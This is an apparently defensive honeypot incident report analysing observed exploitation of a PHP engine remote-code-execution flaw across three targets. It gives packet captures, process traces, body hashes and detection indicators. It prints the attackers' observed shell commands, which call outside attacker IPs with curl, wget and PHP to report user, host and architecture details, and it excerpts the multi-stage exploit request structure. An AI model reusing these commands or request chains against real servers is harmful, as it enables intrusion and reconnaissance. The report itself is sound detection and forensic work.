# PHP2Shell exploitation observed: packet-to-process RCE evidence

**24 October 2026 · UTC · evidence acquired through 19:26–19:31 across six sensors**

**Case evidence dataset:** Per-case HTTP packet captures and selected Apache, PHP, Tetragon, and signal records for all 35 confirmed shells (`A01`–`A03`, `B01`–`B32`) are published in [`2026-10-24-rce-evidence/`](2026-10-24-rce-evidence/README.md).

## Technical summary

Target-side packet captures and Tetragon process events correlate **35 complete execution-stage HTTP POSTs with 35 `/bin/sh` starts directly parented by Apache workers** (`uid=33`) across three PHP targets. Three shell events followed traffic from `15.204.59.70` on T1; 32 followed traffic from `162.35.99.94` on T1, T2, and T3. These are two source-address clusters, not an attribution to two actors.

The requests used a four-stage multipart chain, sometimes with retries: memory pressure, memory disclosure through an oversized `PHPSESSID`, further memory pressure, then a target-adjusted execution stage. Fifty-two disclosure-sized cookies were logged; 51 complete responses were reconstructed in packet captures and acknowledged by the client. Representative complete chains from both source clusters and all three successful targets shared byte-identical A1/B1/A2 bodies. The B2 body varied with the target's leaked address range and the shell command, supporting the **published leak-guided ASLR technique** rather than a new primitive. The traffic closely matches the public HTTP-only PoC family; packet evidence does not identify the exact client or revision used.

## Evidence and scope

The reviewed targets ran PHP 8.4.26 under single-worker Apache `mod_php` with a 128 MiB PHP memory limit. The relevant PHP errors occurred during request startup (`Unknown on line 0`), before application code, consistent with a PHP-engine vulnerability rather than a flaw in a particular CMS. All confirmed execution-stage requests used plaintext HTTP/80. `T1`–`T3` label the three targets throughout this report.

The targets were disposable **phpot** honeypots presenting ordinary PHP-backed pages. The sensor records bidirectional network packets, Apache requests and worker PIDs, PHP errors, and Tetragon process/kernel events. We joined the packet flows to application and process records by source port, time, worker identity, and request sequence; no single alert or HTTP status was treated as proof of execution.

The acquired snapshot contains 3,459 sealed segments and 10,948 manifest-listed files (11.21 GB); all listed sizes and SHA-256 values matched their local copies, and the parsed Apache/Tetragon JSONL records had no malformed lines. The latest sealed window on each sensor ended between 19:26 and 19:31 UTC. Counts below refer to this fixed snapshot.

## Two observed exploitation episodes

| Episode | Source IP | Observed successful target(s) | Disclosure-sized cookies | Apache-parent shells | Shell command pattern |
|---|---|---|---:|---:|---|
| A | `15.204.59.70` | T1 | 3 | 3 | Same `id`/proof-file/`wget` command on all three |
| B | `162.35.99.94` | T1, T2, T3 | 49 | 3 on T1; 19 on T2; 10 on T3 | Changed among PHP CLI, `curl`, and `wget`, later adding dynamic identity checks |

### Episode A — `15.204.59.70`

The source began path probing at 13:47, sent memory-pressure requests by approximately 15:16, and produced its first confirmed Apache-parent shell at 15:35. Two further shells followed at 16:04. All three used the same final-stage request-body hash and shell command. Three disclosure-sized cookies were recorded on T1, all reconstructed as complete and TCP-acknowledged in packet capture. The command tried to write `id` output to a temporary proof file and web roots, then invoke `wget`; the web-root writes met a read-only filesystem and `wget` was absent. The first full packet-to-process timeline appears below.

### Episode B — `162.35.99.94`

The source appeared at 16:36 with disclosure-sized responses, cycled through repeated OOM/leak/crash attempts around 16:44–16:46, and produced its first confirmed shell at 16:46. Tetragon recorded 32 Apache-parent shell starts through 18:57: 19 on T2, ten on T3, and three on T1. Commands changed among PHP CLI, `curl`, and `wget` variants; later proof URLs embedded shell command substitutions for `id -un`, `hostname`, and `uname -m`. Forty-nine disclosure-sized cookies were recorded across those targets; 48 were reconstructed as complete and TCP-acknowledged. The target-dependent final-stage bodies and command changes distinguish this episode from A operationally, while the byte-identical first three request bodies link both episodes to the same exploit template.

**Relationship between episodes:** The shared template, boundary, body hashes, and stage order do **not** establish shared control. Nor do different source IPs and proof commands establish separate actors. The defensible finding is two source-address episodes using closely related tooling.

Separately, `104.28.208.84` and `144.48.4.242` sent exploit-shaped requests associated with PHP errors or worker crashes in the reviewed snapshot. Neither had an observed Apache-parent shell or disclosure-sized cookie; they are **attempt indicators, not confirmed RCE sources**.

The two confirmed source addresses were registered to hosting networks when checked on 24 October: `15.204.59.70` to OVH US LLC (`15.204.0.0/16`) and `162.35.99.94` to Interserver, Inc (`162.35.96.0/19`). The former's PTR, `vps-b225fb62.vps.ovh.us`, resolved back to its IP. The latter's PTR, `vps3749638.trouble-free.net`, had no confirming A record in the lookup. Network registration and PTRs describe infrastructure, not the operators behind it.

## Shared request fingerprint and exploit sequence

### HTTP fingerprint

The successful chains used HTTP/1.1 multipart POSTs to `/` and `/index.php`, no `User-Agent`, and a ten-character `C` multipart boundary. Request-header order was `Host → Content-Type → Transfer-Encoding → Connection` for chunked stages and `Host → Content-Type → Content-Length → Connection` for fixed-length stages. The first memory-pressure request had five numbered `q...=v` query parameters. These characteristics were checked in representative complete packet captures from both source clusters.

### Four request stages on the wire

The table uses complete target-side TCP reassembly from a successful T1 chain at 15:35 UTC. Decoded sizes exclude HTTP chunk framing. The same first three decoded request-body hashes were found in complete successful-chain captures from both sources and all three targets.

| Stage | Start UTC / client port | Request shape | Decoded or fixed body | Observed PHP/HTTP effect |
|---|---|---|---:|---|
| A1 — memory pressure | 15:35:32.793 / `54952` | `POST /?...` · chunked multipart · 973 captured parts; mostly `files*` fields | 1,060,211 B | PHP `memory_limit` exhausted in `Unknown on line 0`, 4,096-B allocation; access log completed with HTTP 200 |
| B1 — disclosure | 15:35:34.127 / `38108` | `POST /` · chunked multipart · 918 parts; mostly repeated `x*` fields | 33,128,677 B | 819,200-B URL-decoded `PHPSESSID` in a complete response; session-startup warnings |
| A2 — memory pressure | 15:35:37.429 / `38122` | `POST /` · fixed-length multipart · 997 parts | 279,369 B | PHP `memory_limit` exhausted in `Unknown on line 0`, 20,480-B allocation |
| B2 — execution | 15:35:38.238 / `38126` | `POST /` · fixed-length multipart · 998 parts, including repeated address-like values | 451,384 B | No normal access-log completion; Apache-parent `/bin/sh` at 15:35:38.673, then worker `SIGSEGV` |

**Body anatomy:** The captured A1 body was dominated by `files*` fields (859 of 973 multipart parts); B1 had 900 `x*` fields among 918 parts; A2 had 880 `files*` fields among 997; B2 had 500 `s*` and 495 `t*` fields among 998. All four included `PHPSESSID` and `PHP_SESSION_UPLOAD_PROGRESS` fields. B2 also contained target-dependent address-like words and a command string; its digest changed when those values or the command changed. The fixed-body SHA-256 indicators are:

| Body | SHA-256 of decoded multipart body |
|---|---|
| A1 | `8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6` |
| B1 | `b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2` |
| A2 | `7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236` |

These digests are over the **decoded body**, not the complete TCP stream or the chunked wire representation. A1 and B1 used `Transfer-Encoding: chunked`; A2 and B2 used `Content-Length`. The attacker sometimes repeated A1/B1 before advancing. The first and third stages produced pre-script PHP errors, while B1 could produce a large cookie or crash the worker. The final request could crash the worker after starting a shell, leaving no completed Apache access entry. HTTP 200 on A1/B1/A2 is therefore not the success criterion.

The B1 digest also appears in the [initial attempt-only capture report](2026-10-22-to-24-initial-attempts.md), where identical B1 bodies preceded worker crashes without confirmed RCE. It identifies a payload family, not an execution outcome by itself.

### Memory disclosure and ASLR adjustment

Apache recorded 52 disclosure-sized cookies: three for A on T1 and, for B, four on T1, 29 on T2, and 16 on T3. Each decoded to 819,200 bytes. The decoded values were not ordinary session IDs: they contained repeated aligned, pointer-like 64-bit words, including a dominant word repeated 1,095 times in representative leaks. Matching the cookie's SHA-256 from Apache to target-side PCAPs gave **51 complete responses with zero captured response gaps and a client ACK through the response end** (T1 7/7, T2 28/29, T3 16/16). The remaining T2 capture begins mid-response; Apache recorded the cookie, but its complete packet delivery is not established by that file.

The dominant disclosed pointer differed in absolute value across representative T1, T2, and T3 leaks. An address-like word in their corresponding B2 bodies maintained the same relative difference from that value across the three targets. Along with the request sequence, this supports leak-guided adjustment to each target's randomized memory layout rather than one hard-coded address accidentally working everywhere. The public [9bie HTTP-only PoC](https://github.com/9bie/php2shell-bypass-aslr-exp/blob/d6f888ebd3f0e188bb662e16f23747afdf35e42f/exploit.py#L252-L271) uses the same type of relative calculation and request roles; [Wiz's PHP2Shell research](https://www.wiz.io/blog/php2shell-php-rce) describes the underlying PHP upload-progress/disclosure family. The observed chain is consistent with **CVE-2026-109618**; these records do not establish use of a distinct CVE-2026-109619 path.

The public [`exploit.py` revision examined on 24 October](https://github.com/9bie/php2shell-bypass-aslr-exp/blob/d6f888ebd3f0e188bb662e16f23747afdf35e42f/exploit.py#L93-L117) filters disclosed pointers below `0x7f0000000000`. The early successful chains had no pointer-like words above that threshold in their observed cookies, so an unchanged run of that revision would not parse those leaks. Two later T3 cookies *did* contain qualifying pointers. The traffic therefore does not support a blanket claim that every successful run required a modified PoC; a small change, another revision, or a different client could explain the early chains. Packet captures cannot identify which implementation was used.

## Case evidence: HTTP request to Apache child process

### Episode A: first confirmed execution

The first T1 execution illustrates the evidence chain without relying on a 500 response or an alert label:

```text
15:35:32.793  15.204.59.70:54952  A1 POST begins; complete 1,060,211-B decoded body
15:35:33      PHP: Allowed memory size of 134217728 bytes exhausted
                (tried to allocate 4096 bytes) in Unknown on line 0
15:35:34.127  15.204.59.70:38108  B1 POST begins; 33,128,677-B decoded body
15:35:34.205  Apache access record (request timestamp): worker PID 31;
                disclosure-sized Set-Cookie reported for this request
15:35:37.429  15.204.59.70:38122  A2 POST begins; 279,369-B body
15:35:37      PHP: Allowed memory size of 134217728 bytes exhausted
                (tried to allocate 20480 bytes) in Unknown on line 0
15:35:38.238  15.204.59.70:38126  B2 POST begins; 451,384-B body
15:35:38.673  Tetragon: apache2 → /bin/sh, UID 33; /bin/sh → /usr/bin/id
15:35:39.379  Apache: child PID 31 exited on Segmentation fault (11)
```

Apache logged A1, B1, and A2 on the same worker (container PID 31). Its normal B2 access line is absent because the worker died. Packet source ports and worker socket events link the sequence to the host PID that Tetragon recorded as the shell's Apache parent. The shell attempted an `id` proof file and web-root writes; Apache recorded `Read-only file system` for the web-root attempts and `wget: not found` for the attempted fetch. Those errors are additional evidence that the command reached a shell, while the `process_exec` parentage is the decisive execution observation.

### Episode B: first confirmed execution

The first T2 chain shows the same transition with a different command:

```text
16:46:48.684  162.35.99.94:36836  A1 POST; same decoded-body SHA-256 as T1
16:46:50.785  162.35.99.94:36844  B1 POST; 819,200-B decoded PHPSESSID returned
16:46:56.700  162.35.99.94:36846  A2 POST /index.php; pre-script OOM
16:46:58.166  162.35.99.94:47720  B2 POST /index.php; complete 451,384-B body
16:46:59.197  Tetragon: apache2 → /bin/sh, UID 33
16:46:59.201  Tetragon: /bin/sh → /usr/local/bin/php -r ...
16:47:59      PHP CLI: file_get_contents(http://162.35.99.94:8080/pwn-[T2-honeypot-IP]) timed out
16:47:59.530  Apache: worker exited on Segmentation fault (11)
```

Later T2 shells used `curl` and `wget` variants. For example, at 16:50:49 Tetragon recorded `apache2 → /bin/sh → /usr/bin/curl` after B2, then a `tcp_connect` for `162.35.99.94:8080` in `TCP_SYN_SENT`. At 17:27:25 on T3 it recorded `apache2 → /bin/sh` with a `wget` command; Apache then emitted `wget: not found` and the worker crashed. At 18:55:02, the same source reached T1: the complete B2 request began at 18:55:02.387 and an Apache-parent shell followed at 18:55:02.429. Two more T1 shells followed at 18:57. These are distinct process-level observations on independent targets, not repeated parsing of one HTTP error.

### Selected runtime records

These normalized records retain the observed command content, including proof paths. `[T1-honeypot-IP]` through `[T3-honeypot-IP]` replace addresses of the three targets, not the attacker endpoints. PHP and Apache lines are correlated by the request window; Tetragon records process parentage directly.

```text
T1 15:35:33      php_error     Allowed memory size of 134217728 bytes exhausted
   (tried to allocate 4096 bytes) in Unknown on line 0
T1 15:35:36      php_error     PHP Request Startup: Session ID is too long or contains illegal characters
T1 15:35:38.673  process_exec  apache2 → /bin/sh  uid=33
   args: id>/tmp/x1; for d in /var/www/html /var/www; do id>$d/p1; done;
         wget -q http://15.204.59.70:8081/ok33
T1 15:35:38.674  process_exec  /bin/sh → /usr/bin/id  uid=33
T1 15:35:38.676  security_file_permission  /tmp/x1  return=0
T1 after B2       Apache stderr  web-root proof writes: Read-only file system; wget: not found
T2 16:46:59.197  process_exec  apache2 → /bin/sh → /usr/local/bin/php
   args: php -r 'file_get_contents("http://162.35.99.94:8080/pwn-[T2-honeypot-IP]");'
T2 16:46:59.268  tcp_connect   /usr/local/bin/php → 162.35.99.94:8080
   state=TCP_SYN_SENT; return=0
T2 16:47:59      php_error     file_get_contents(...): Failed to open stream: Connection timed out
T2 16:50:49.133  process_exec  apache2 → /bin/sh → /usr/bin/curl
   args: curl -s http://162.35.99.94:8080/pwn-[T2-honeypot-IP] >/dev/null
T2 16:50:49.153  tcp_connect   /usr/bin/curl → 162.35.99.94:8080
   state=TCP_SYN_SENT; return=0
T3 17:27:25.919  process_exec  apache2 → /bin/sh  uid=33
   args: wget -q -O- http://162.35.99.94:80/pwn-[T3-honeypot-IP]
T3 after B2       Apache stderr  sh: 1: wget: not found
T3 18:08:20.091  process_exec  apache2 → /bin/sh  uid=33
   args: curl -s "http://162.35.99.94:80/ID-$(id -un)-$(hostname)-$(uname -m)"
T3 18:08:20.093–.102  process_exec  /bin/sh → id -un, hostname, uname -m, curl
T3 18:08:20.116  tcp_connect   /usr/bin/curl → 162.35.99.94:80
   state=TCP_SYN_SENT; return=0
```

## Complete case index: 35 confirmed shell events

Every row below has a complete 451,384-B B2 request in target-side PCAP immediately before a Tetragon `/bin/sh` `process_exec` with `parent.binary=/usr/sbin/apache2` and `uid=33` (released per case under [`2026-10-24-rce-evidence/`](2026-10-24-rce-evidence/README.md)). `B2 port` is the **attacker's TCP source port**. `Event ref` identifies the target alias, sealed-segment sequence, and line of its Tetragon JSONL; it does not expose a target address. A source port and time identify the matching PCAP flow. Command descriptions summarize the observed process arguments, not hypothetical intent.

### Episode A: three shells on T1

| Case | Shell time UTC | Source | Target | B2 port | Shell command string | Event ref |
|---|---|---|---|---:|---|---|
| A01 | 15:35:38.673 | `15.204.59.70` | T1 | 38126 | `id`, proof-file writes, `wget` attempt | T1/554:7 |
| A02 | 16:04:16.649 | `15.204.59.70` | T1 | 41688 | same command | T1/560:12 |
| A03 | 16:04:26.482 | `15.204.59.70` | T1 | 35608 | same command | T1/560:29 |

### Episode B: 32 shells across T1, T2, and T3

| Case | Shell time UTC | Source | Target | B2 port | Shell command string | Event ref |
|---|---|---|---|---:|---|---|
| B01 | 16:46:59.197 | `162.35.99.94` | T2 | 47720 | PHP CLI `file_get_contents` | T2/539:74 |
| B02 | 16:48:14.685 | `162.35.99.94` | T2 | 58006 | PHP CLI `file_get_contents` | T2/539:94 |
| B03 | 16:49:31.689 | `162.35.99.94` | T2 | 35592 | PHP CLI `file_get_contents` | T2/540:16 |
| B04 | 16:50:49.133 | `162.35.99.94` | T2 | 60058 | `curl` | T2/540:34 |
| B05 | 16:53:18.121 | `162.35.99.94` | T2 | 55526 | `curl` | T2/540:52 |
| B06 | 16:55:55.136 | `162.35.99.94` | T2 | 40570 | `curl` | T2/541:19 |
| B07 | 16:58:26.497 | `162.35.99.94` | T2 | 57986 | `wget` invocation | T2/541:37 |
| B08 | 16:58:41.875 | `162.35.99.94` | T2 | 45880 | `wget` invocation | T2/541:51 |
| B09 | 16:59:00.644 | `162.35.99.94` | T2 | 56022 | PHP CLI `file_get_contents` | T2/542:11 |
| B10 | 17:00:16.319 | `162.35.99.94` | T2 | 57884 | PHP CLI `file_get_contents` | T2/542:29 |
| B11 | 17:22:14.699 | `162.35.99.94` | T2 | 47450 | `curl` | T2/546:12 |
| B12 | 17:27:25.919 | `162.35.99.94` | T3 | 59218 | `wget` invocation | T3/547:24 |
| B13 | 17:29:11.649 | `162.35.99.94` | T2 | 35566 | `curl` | T2/548:7 |
| B14 | 17:32:13.902 | `162.35.99.94` | T2 | 58420 | `curl` | T2/548:26 |
| B15 | 17:35:10.898 | `162.35.99.94` | T2 | 49850 | `curl` | T2/549:21 |
| B16 | 18:05:33.769 | `162.35.99.94` | T3 | 48722 | `curl`, dynamic user/host proof | T3/555:27 |
| B17 | 18:08:20.091 | `162.35.99.94` | T3 | 49862 | `curl`, dynamic user/host/architecture proof | T3/555:57 |
| B18 | 18:10:45.950 | `162.35.99.94` | T3 | 55942 | same command as B17 | T3/556:16 |
| B19 | 18:13:15.803 | `162.35.99.94` | T3 | 60664 | same command as B17 | T3/556:43 |
| B20 | 18:15:41.375 | `162.35.99.94` | T3 | 60038 | same command as B17 | T3/557:16 |
| B21 | 18:18:07.881 | `162.35.99.94` | T3 | 44576 | `curl`, dynamic user/host proof | T3/557:43 |
| B22 | 18:20:32.632 | `162.35.99.94` | T3 | 53044 | same command as B21 | T3/558:16 |
| B23 | 18:21:11.692 | `162.35.99.94` | T2 | 37876 | `curl`, dynamic user/host proof | T2/558:12 |
| B24 | 18:23:41.248 | `162.35.99.94` | T2 | 56660 | same command as B23 | T2/558:34 |
| B25 | 18:41:52.335 | `162.35.99.94` | T3 | 48488 | `curl`, dynamic user/host proof | T3/562:15 |
| B26 | 18:43:37.098 | `162.35.99.94` | T2 | 34340 | `curl`, dynamic username proof | T2/562:22 |
| B27 | 18:44:18.227 | `162.35.99.94` | T3 | 44566 | `curl`, dynamic user/host proof | T3/563:16 |
| B28 | 18:46:04.735 | `162.35.99.94` | T2 | 57250 | `wget`, dynamic username proof | T2/563:19 |
| B29 | 18:46:20.785 | `162.35.99.94` | T2 | 55318 | same command as B28 | T2/563:35 |
| B30 | 18:55:02.429 | `162.35.99.94` | T1 | 58972 | `curl`, dynamic username proof | T1/594:21 |
| B31 | 18:57:23.265 | `162.35.99.94` | T1 | 44436 | `wget`, dynamic username proof | T1/595:16 |
| B32 | 18:57:29.320 | `162.35.99.94` | T1 | 36458 | same command as B31 | T1/595:32 |

Some final requests have no completed Apache access entry because their worker crashed; the packet flow and process event provide the evidence for those rows. Successful RCE is **not** inferred from a PHP OOM, a `PHPSESSID` alone, or `AH00051` alone. The decisive difference is the unexpected Apache-parent shell, followed in several cases by independently observed `id`, PHP CLI, or `curl` child processes.

### Complete observed shell commands

Tetragon captured one Apache-parent `/bin/sh` event for each case above. These are the 14 distinct original commands after the shell's `-c --` wrapper; each case maps to exactly one row. Embedded target addresses are replaced with the corresponding `[T1-honeypot-IP]`, `[T2-honeypot-IP]`, or `[T3-honeypot-IP]` label; other command text is retained. The execution-stage HTTP payload is the corresponding 451,384-byte B2 body, indexed by SHA-256 below.

| Cases | Observed command |
|---|---|
| A01–A03 | `id>/tmp/x1;for d in /var/www/html /var/www;do id>$d/p1;done;wget -q http://15.204.59.70:8081/ok33` |
| B01–B03 | `php -r 'file_get_contents("http://162.35.99.94:8080/pwn-[T2-honeypot-IP]");'` |
| B04–B05 | `curl -s http://162.35.99.94:8080/pwn-[T2-honeypot-IP] >/dev/null` |
| B06, B11, B13–B15 | `curl -s http://162.35.99.94:80/pwn-[T2-honeypot-IP]` |
| B07–B08 | `wget -q -O- http://162.35.99.94:80/pwn-[T2-honeypot-IP]` |
| B09–B10 | `php -r 'file_get_contents("http://162.35.99.94:80/pwn-[T2-honeypot-IP]");'` |
| B12 | `wget -q -O- http://162.35.99.94:80/pwn-[T3-honeypot-IP]` |
| B16 | `curl -s http://162.35.99.94:80/PROOF-$(id -un)-$(hostname)` |
| B17–B20 | `curl -s "http://162.35.99.94:80/ID-$(id -un)-$(hostname)-$(uname -m)"` |
| B21–B25, B27 | `curl -s http://162.35.99.94:80/ID-$(id -un)-$(hostname)` |
| B26 | `curl -s http://162.35.99.94:80/pwn-[T2-honeypot-IP]-$(id -un)` |
| B28–B29 | `wget -q -O- http://162.35.99.94:80/pwn-[T2-honeypot-IP]-$(id -un)` |
| B30 | `curl -s http://162.35.99.94:80/pwn-[T1-honeypot-IP]-$(id -un)` |
| B31–B32 | `wget -q -O- http://162.35.99.94:80/pwn-[T1-honeypot-IP]-$(id -un)` |

Apache logged `sh: 1: wget: not found` for the `wget` commands; `/ok33` was observed in the command line, not recovered as a fetched file. Tetragon recorded `id`, PHP CLI, and `curl` child processes; the PHP CLI request timed out. No downloaded second-stage file was observed in the reviewed evidence.

### Execution-stage body digests

These SHA-256 values cover the complete 451,384-byte B2 bodies matched to the case index. B2 changes with the target-specific address-like values and command; repeated digests identify exact body reuse.

| SHA-256 | Cases |
|---|---|
| `e538361aa02f01bb9e00f53d2107eb1369f778203033e08506496a767c0e4abc` | A01–A03 |
| `aab24fa5ec0df76f731c1ea4bac9fd36aa350eef9a42c33315e485178e1e5892` | B01–B03 |
| `b8a67dc5173272afd95cd603b2bd7b49bb6e0900af53237096b8caf9fd48ca97` | B04–B05 |
| `567659d699213c360e4598c257c40260cf0d7b1377e4a25851ca3f59a427899c` | B06, B11, B13–B15 |
| `a744539cce8295ac07ca70fd5eab9601ef79fb62f142749373d855033fb101e0` | B07–B08 |
| `675647c9919681e3f6a58c54be30a22942b523e036ee53f0e4fdccf22a506408` | B09–B10 |
| `d2d86024e947cbdcecb725e3dae4930579b28f23bff80eedaad6b3f11544bcff` | B12 |
| `dcb4e2b4f6879827222d0bb5efa14dc838357251880302401bc8702bb3085370` | B16 |
| `b8e69e39c49c986a6edae77f08b11be1ab1675d4fda6c05dcf0628149eefbd06` | B17–B20 |
| `c1263f68fcb9565dc3b162481574ed6f64ad11436e654751a9da4644352bbcee` | B21–B22 |
| `c61540651b07f744fa9d43ff326daa7a81c51f90ffdd05b28d1b552ade5320a4` | B23–B24 |
| `c1fc4df4a886aff090471f27a40c29358444b3668257e1b2074577477ba2e36c` | B25, B27 |
| `ff73391d30efd875a28c65178a59cacf6b933f911ae51654b2ffb4d4d3fe850a` | B26 |
| `23b0d9cb7dce28dbeb9749d2664eacd64474f7a4fab3c152747603c33214e58a` | B28–B29 |
| `77afd5bf9c28069616b514a2955dbf52dc62e3b5c5c04c1e86c7a3c3fc5a5156` | B30 |
| `e5a9ca54352814eaefc2051013aa424d4e6fd780a2c0d1085fdd35eac392e5c4` | B31–B32 |

## Detection indicators

For the observed activity, the strongest cross-source sequence is: HTTP/1.1 chunked multipart memory pressure with pre-script `Unknown on line 0` OOM; a ~33.1-MB chunked multipart request followed by an unusually large `PHPSESSID`; a ~279-KB fixed-length multipart request and another OOM; then a ~451-KB fixed-length multipart request followed by an Apache-parent shell. The fixed decoded-body hashes above, absent `User-Agent`, repeated multipart boundary, and consistent header order provide additional clustering features. A worker crash may occur between stages or immediately after process creation.

The fixed bodies and request roles align closely with the public [9bie `exploit.py`](https://github.com/9bie/php2shell-bypass-aslr-exp/blob/d6f888ebd3f0e188bb662e16f23747afdf35e42f/exploit.py). The evidence demonstrates this chain on the intentionally favorable single-worker `mod_php` profile; it is not a measurement of exploit reliability on other worker counts, PHP builds, or applications.

## Appendix: representative request excerpts

These are shortened excerpts from complete TCP-reassembled requests in confirmed chains. `Host` is replaced with `example.invalid`; chunk framing is omitted from the displayed body, and ellipses or bracketed text mark omitted bytes. Body lengths and SHA-256 values refer to the complete decoded multipart bodies.

### A1 — memory-pressure request, episode A

`15.204.59.70:54952` → T1, 15:35:32.793 UTC; decoded body 1,060,211 bytes.

```http
POST /?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v HTTP/1.1
Host: example.invalid
Content-Type: multipart/form-data; boundary=CCCCCCCCCC
Transfer-Encoding: chunked

--CCCCCCCCCC
Content-Disposition: form-data; name="PHPSESSID"

[NUL byte]
--CCCCCCCCCC
Content-Disposition: form-data; name="files[R00000...][a]..."; filename="A"
Content-Type: [repeated C bytes]

[remaining multipart parts omitted; 973 captured parts in total]
```

### B1 — memory-disclosure request, episode B

`162.35.99.94:36844` → T2, 16:46:50.785 UTC; decoded body 33,128,677 bytes, SHA-256 `b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2`.

```http
POST / HTTP/1.1
Host: example.invalid
Content-Type: multipart/form-data; boundary=CCCCCCCCCC
Transfer-Encoding: chunked

--CCCCCCCCCC
Content-Disposition: form-data; name="PHPSESSID"

a
--CCCCCCCCCC
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

k0
--CCCCCCCCCC
Content-Disposition: form-data; name="f0000ffff..."

[repeated filler and remaining multipart parts omitted; 918 parts in total]
```

### B2 — execution-stage request, episode B

`162.35.99.94:47720` → T2, 16:46:58.166 UTC; body 451,384 bytes, SHA-256 `aab24fa5ec0df76f731c1ea4bac9fd36aa350eef9a42c33315e485178e1e5892`.

```http
POST /index.php HTTP/1.1
Host: example.invalid
Content-Type: multipart/form-data; boundary=CCCCCCCCCC
Content-Length: 451384

--CCCCCCCCCC
Content-Disposition: form-data; name="s000000000"

[binary, address-dependent content omitted]
[additional s*, t*, and session-progress fields omitted; 998 parts in total]
```
